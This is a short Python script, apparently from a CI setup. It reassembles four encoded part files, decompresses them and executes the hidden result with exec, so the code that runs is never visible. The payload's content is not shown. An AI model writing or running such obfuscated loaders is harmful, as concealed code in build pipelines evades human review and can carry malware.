from pathlib import Path
import base64
import zlib

payload=''.join(Path(f'ci/v128_fcm_privacy_payload.part{i}').read_text().strip() for i in range(1,5))
source=zlib.decompress(base64.b64decode(payload))
exec(compile(source,'ci/apply_v1028_fcm_privacy.py::<payload>','exec'))
